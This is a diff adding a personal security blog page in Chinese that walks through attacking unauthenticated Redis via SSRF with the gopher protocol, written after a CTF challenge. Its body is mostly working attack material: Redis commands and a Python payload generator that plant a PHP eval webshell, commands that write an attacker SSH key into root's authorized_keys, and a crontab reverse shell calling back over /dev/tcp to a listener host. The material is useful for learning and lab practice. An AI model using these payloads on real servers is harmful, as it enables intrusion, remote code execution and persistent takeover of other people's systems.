@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="昨天做了网鼎杯玄武组的SSRFME那道题，对于redis的利用不是很熟悉，今天搭一下环境把能利用的方式能过一遍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis配置及SSRF利用">
+<meta property="og:url" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="昨天做了网鼎杯玄武组的SSRFME那道题，对于redis的利用不是很熟悉，今天搭一下环境把能利用的方式能过一遍">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/9.png">
+<meta property="article:published_time" content="2020-07-16T07:12:53.000Z">
+<meta property="article:modified_time" content="2020-07-16T11:27:01.170Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>redis配置及SSRF利用 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis配置及SSRF利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-16 15:12:53 / Modified: 19:27:01" itemprop="dateCreated datePublished" datetime="2020-07-16T15:12:53+08:00">2020-07-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>昨天做了网鼎杯玄武组的SSRFME那道题，对于redis的利用不是很熟悉，今天搭一下环境把能利用的方式能过一遍<a id="more"></a></p>
+<h3 id="安装及配置"><a href="#安装及配置" class="headerlink" title="安装及配置"></a>安装及配置</h3><p>第一步：进入到/home/data目录下</p>
+<p>第二步： wget <a href="http://download.redis.io/releases/redis-3.2.6.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-3.2.6.tar.gz</a>  安装压缩包</p>
+<p>第三步：解压 tar -zxvf redis-3.2.6.tar.gz</p>
+<p>第四步：编译生成可执行环境（没有gcc会报错，安装一下gcc，其他报错可忽略）</p>
+<p>第五步：拷贝redis-cli 、 redis-server 到 /usr/local/redis/目录，再回到redis-2.6.14 源码目录 将redis.conf 文件复制到 redis 目录下</p>
+<p>第六步：修改redis.conf配置信息，daemonize no，no改为yes，protected=mode yes改成no，bind 127.0.0.1注释掉，具体作用在配置信息的注释信息中都有</p>
+<p>开启redis服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>再用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree</span><br></pre></td></tr></table></figure>
+
+<p>看一下有没有redis服务在运行</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png" class="">
+
+<h3 id="REDIS配合gopher协议进行SSRF"><a href="#REDIS配合gopher协议进行SSRF" class="headerlink" title="REDIS配合gopher协议进行SSRF"></a>REDIS配合gopher协议进行SSRF</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>gopher协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能未授权或者能通过弱口令认证访问到Redis服务器</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1.绝对路径写shell</p>
+<p>2.写ssh公钥</p>
+<p>3.写contrab计划任务反弹shell</p>
+<h4 id="绝对路径写shell"><a href="#绝对路径写shell" class="headerlink" title="绝对路径写shell"></a>绝对路径写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">get webshell</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/2.png" class="">
+
+<p>可以看到shell已经成功写入，访问一下该文件</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/3.png" class="">
+
+<p>这里也可以用脚本来生成，之前做过一道redis的，脚本还存着</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.52.253.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/4.png" class="">
+
+<p>用上面的脚本生成payload，打过去，看一下shell.php文件内容能否读到</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/5.png" class="">
+
+<p>成功，下面就可以getshell了，看一下我这台linux根目录下的文件</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/6.png" class="">
+
+<h4 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h4><p>在/root下创建一个.ssh文件夹</p>
+<p>redis命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>下面的是修改了上面的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">shell=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP1+B2rcH7ejmH9znCeQdIshPuCkiA+eAYZwApNT5vimPsk7OrP8Qw6GDKrGskY8N6tTH6YGZiNqxpVtEZIYDhiSnRxoplcGgFmMY9pCjFgUKifrN6xeA4PSuxNtUGpcOKVzs/T8SJaHLEtCzKLMnySZ/xBpMQ4CftbH1LKKNQTZRq0XCICW8q9TtZZhvhCnBqIDRD4EmmRGurObK67PjX4kPo1Ej5fIeEYUDN+tHpRP2t4a5BAgdqs7veoQS0GE6774yLyyD+LmaoiNH9NuymVQ36DZ9jOsofYDG173OKrx4tIHW3/xtYQKwgHq9TNYbmXl/c1n5Y3s1ZJ/i/2YruVcRUSMo0u1GgkNn2PDcSw2h2BGZLHm9tGLHe6mSzCIg59RBIT3SXAXqSxwzwpIlchwN0clpnnAhzd4jkKkl1usorrNL8WTWt6kLrD18SaOOO4mZStRX6nKTL3Wo/6V+A75kUQZZMeLgRxU0vWe3wnSHazwKKpf2WjDaGum3vUw0= root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></table></figure>
+
+<p>打过去</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/7.png" class="">
+
+<p>看一下能不能读到该文件</p>
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/8.png" class="">
+
+<p>成功写入了，但是ssh连不上，跟我开始想的一样，应该要两台linux来进行该操作，并且另一台也要装了redis，找了篇文章，有具体操作，大概是这样，看了那些师傅的思路，以及总结，大概率不会碰到这种情况的题<a href="https://www.cnblogs.com/cute-puli/p/10870885.html，这就以后有时间再自己操作了" target="_blank" rel="noopener">https://www.cnblogs.com/cute-puli/p/10870885.html，这就以后有时间再自己操作了</a></p>
+<h4 id="写contrab计划任务反弹shell"><a href="#写contrab计划任务反弹shell" class="headerlink" title="写contrab计划任务反弹shell"></a>写contrab计划任务反弹shell</h4><p>起两台机子，虚拟机上跑，都要装redis</p>
+<p>直接上payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.20:6379&gt;CONFIG SET dir &#x2F;var&#x2F;spool&#x2F;cron &lt;--切换到定时任务目录</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;CONFIG SET dbfilename root   &lt;--生成一个名为root的文件</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;set payload &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.160&#x2F;9999 0&gt;&amp;1\n\n&quot;  &lt;--设置反弹shell</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;save </span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;exit</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/9.png" class="">
+
+<p>另一台机子上监听对应端口号，很快就能弹回shell，但是我这有一台是ubuntu，所以弹不回，权限问题，最好还是kali+centos，下次装好了和上面的ssh一块再试试</p>
+<h4 id="主从复制SSRF"><a href="#主从复制SSRF" class="headerlink" title="主从复制SSRF"></a>主从复制SSRF</h4><p>待补充…………………….</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/" title="redis配置及SSRF利用">http://yoursite.com/2020/07/16/redis配置及SSRF利用/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/redis/" rel="tag"># redis</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/" rel="prev" title="网鼎杯2020玄武组SSRFMe">
+      <i class="fa fa-chevron-left"></i> 网鼎杯2020玄武组SSRFMe
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/22/ctf473831530-2018-web-virink-web/" rel="next" title="ctf473831530_2018_web_virink_web">
+      ctf473831530_2018_web_virink_web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装及配置"><span class="nav-number">1.</span> <span class="nav-text">安装及配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#REDIS配合gopher协议进行SSRF"><span class="nav-number">2.</span> <span class="nav-text">REDIS配合gopher协议进行SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#概述"><span class="nav-number">2.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">2.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">2.3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绝对路径写shell"><span class="nav-number">2.4.</span> <span class="nav-text">绝对路径写shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写ssh公钥"><span class="nav-number">2.5.</span> <span class="nav-text">写ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写contrab计划任务反弹shell"><span class="nav-number">2.6.</span> <span class="nav-text">写contrab计划任务反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主从复制SSRF"><span class="nav-number">2.7.</span> <span class="nav-text">主从复制SSRF</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
